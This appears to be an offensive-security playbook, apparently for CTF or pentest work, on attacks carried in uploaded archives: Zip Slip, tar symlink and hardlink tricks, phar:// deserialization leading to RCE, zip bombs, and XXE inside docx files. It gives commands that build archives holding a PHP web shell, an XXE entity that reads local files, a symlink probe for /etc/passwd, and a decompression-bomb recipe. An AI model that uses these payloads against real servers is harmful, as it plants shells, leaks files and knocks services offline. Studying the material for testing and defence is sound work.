# Archive Attacks — zip, tar, phar, and the parsers between

## The shape — what the app does with the archive decides the attack

```
upload → extract → serve/parse contents   → Zip Slip / symlink / RCE-inside
upload → parse manifest/list only         → XXE (docx), XML bombs
upload → include/require via phar://      → PHP object injection
upload → store and count/validate         → zip bomb / algorithmic DoS
upload → thumbnail/preview                → delegate to image/document attacks
```

## Minting hostile archives — `tools/web/archive_gen.py`

`tar`/`zip`/PHP don't need to be on the box:

```bash
# zip with traversal entries:
python3 tools/web/archive_gen.py zipslip --out evil.zip \
  --name shell.php --content '<?php system($_GET["c"]); ?>' --depth 8
python3 tools/web/archive_gen.py zipslip --out evil.zip --absolute \
  --name shell.php --content '<?php ... ?>'        # adds /abs-path entries

# tar with traversal entries plus a symlink member:
python3 tools/web/archive_gen.py tarslip --out evil.tar \
  --name shell.php --content '<?php ... ?>' --depth 8 \
  --link-target /var/www/html --link-name link

# phar with controlled serialized metadata (unserialize sink on phar://):
python3 tools/web/archive_gen.py phar --out x.phar \
  --metadata 'O:8:"SomeCls":1:{s:4:"prop";s:3:"val";}'
python3 tools/web/archive_gen.py phar --out x.phar --marker   # stdClass canary
```

## Zip Slip — the canonical archive traversal

Entry names are raw paths — every form:

```
../../x.php             # POSIX relative
..\..\x.php             # Windows separators inside entries
/x.php                  # absolute (some extractors honor)
..%2f..%2f              # decoded by some pipelines
```

Extractor behavior differs — Python `zipfile.extractall` *does* normalize
`..` out (modern versions), Java `ZipInputStream` + naive `new File(dir,
name)` does NOT, Node `adm-zip`/`unzipper` versions vary, `unzip -d`
sanitizes. White-box: find the exact extractor and check whether it
guards entry paths.

## Tar-specific tricks

- **traversal entries** — same as zip
- **symlink member + write-through**: `link -> /target` then `link/x.php`
  — GNU tar extracts `link` then writes `x.php` under the link target
- **hardlink members** — `linkname` field to an existing filesystem file;
  extractors that honor hardlinks expose the target file inside the tree
- **PAX headers** — `path` override in extended headers; some parsers read
  the PAX path, others the legacy name field — disagreement = slip
- **device/FIFO members** — rarely honored, but `mknod` on extract is a
  classic fail-open

## phar:// — the PHP-specific deserialization path

A `.phar` file is a PHP archive; its metadata is `unserialize`d on any
`phar://` access — including **indirect** ones:

```php
file_exists('phar://uploads/x.jpg/test')    # triggers unserialize
include('phar://uploads/x.jpg/x.php')        # execution
is_file, file_get_contents, fopen, exif_read_data(!), getimagesize
```

If ANY file-op API on the server takes a path you control (image
validators call `getimagesize`, `exif_read_data`!), a `phar://` path to an
uploaded file deserializes its metadata → POP chain → RCE. The file does
not need a `.phar` extension — `phar://` keys on content, and a phar can be
a JPEG polyglot (stub first, then `<?php __HALT_COMPILER();` + manifest +
jpeg bytes elsewhere). `archive_gen.py phar --marker` mints a canary.

The whitebox grep: `file_exists|is_file|fopen|getimagesize|exif_read_data|
file_get_contents|md5_file|sha1_file|mime_content_type` on a request-
controlled path + an upload.

## Zip bomb — decompression DoS

- flat: `dd if=/dev/zero bs=1M count=N | zip` — N GB of zeros deflate to KBs
- nested (42.zip): layer zips containing zips, expansion exponential
- ratio limits: many validators check `compressed_size` only — uncompressed
  side is the bomb
- target is **the decompressing worker**: memory (`read()`), disk
  (`extractall`), CPU (nested). In CTF it's usually the intended DoS lesson
  or a scoring side-effect; confirm there's a decompression step first
- XML bomb cousin: billion-laughs inside a docx/xlsx/svg XML part

## XXE inside office archives

docx/xlsx/pptx/odt are zip+XML — parsers (PHPWord, python-docx, Apache POI,
OpenXML SDK) may resolve entities:

```xml
<!-- word/document.xml inside the docx -->
<!DOCTYPE w:document [<!ENTITY x SYSTEM "file:///flag">]>
<w:document>...<w:t>&x;</w:t>...</w:document>
```

Insert into `word/document.xml` (docx), `xl/worksheets/sheet1.xml` (xlsx),
`content.xml` (odt). The entity must surface in a field the app renders
back (converted HTML, preview, export) → `web-xxe` skill for payload depth.

## RAR / 7z / gz quirks

- `unrar`/`7z` on the box — same slip shape; `.rar` slip via crafted names
- `.tar.gz`/`.tgz` — same tar attacks once decompressed
- gzip is single-file — the danger is where the *content* lands, not paths
- self-extracting stubs (`PK` + PE prefix) — polyglot by construction

## Content-disposition traps — archives that ARE the payload

- `.jar`/`.war` to an autodeploy dir = app deploy
- `.whl`/`.egg`/`.gem`/`.nupkg` — package-install hooks run install scripts
- `.phar` — PHP archive executed on include
- `.htaccess` in a zip that lands in the webroot — config attack
- `__MACOSX/`/`.DS_Store` side-effects — mostly noise
- `.pth` files into `site-packages` (Python zip/site dirs) — code on import

## Extraction-sink discovery — black-box probes

1. upload a zip containing `probe_<rand>.txt` — does the app list/extract
   contents in the response? An echoed manifest = extraction confirmed
2. upload the zipslip canary with `--name pwned.txt`, then fetch
   `../../` levels of likely serve dirs — a landed file proves slip
3. symlink canary: tar with `link -> /etc` + `link/passwd` — fetch the
   extracted `passwd` for file-read proof
4. phar canary: `--marker` phar + `phar://uploads/x` path into any file-op
   endpoint — a PHP object-instantiation error or behavior delta proves
   the unserialize ran

## Falsifiers

- the archive is stored, never extracted or included
- the extractor demonstrably sanitizes entry paths (probe zip+tar slips;
  read the extraction code)
- `phar` wrapper is disabled (`phar.readonly`, open_basedir) or no
  request-controlled path reaches a file-op API

## Output to record

- the extractor identified + which entry form slipped through
- the landed path / read-back URL
- for phar: the file-op endpoint + the class serialized in metadata
